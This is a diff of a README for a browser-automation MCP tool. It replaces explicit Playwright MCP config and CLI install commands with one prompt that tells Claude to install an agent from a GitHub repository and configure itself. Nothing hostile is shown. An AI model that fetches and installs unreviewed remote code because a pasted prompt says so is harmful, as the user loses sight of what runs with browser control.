@@ -6,41 +6,15 @@ Give Claude extraordinary browser control. Navigate websites, click, fill forms,
 
 ---
 
-## Install in 30 seconds
+## Install
 
-### Claude Desktop
+Open Claude Desktop or Claude Code and paste this:
 
-Open your config file and paste this:
-
-| OS | Config file |
-|----|-------------|
-| Windows | `%APPDATA%\Claude\claude_desktop_config.json` |
-| macOS | `~/Library/Application Support/Claude/claude_desktop_config.json` |
-
-```json
-{
-  "mcpServers": {
-    "browser": {
-      "command": "npx",
-      "args": ["@playwright/mcp", "--browser", "chromium"]
-    }
-  }
-}
+```
+Install this MCP agent: https://github.com/sypnose-cloud/agent-free
 ```
 
-**Restart Claude Desktop. Done.**
-
-> First time only: run `npm install -g @playwright/mcp` if Claude says the browser tool isn't available.
-
----
-
-### Claude Code (CLI)
-
-```bash
-claude mcp add browser -- npx @playwright/mcp --browser chromium
-```
-
-Done. No restart needed.
+Claude reads the repo and configures everything automatically.
 
 ---
 
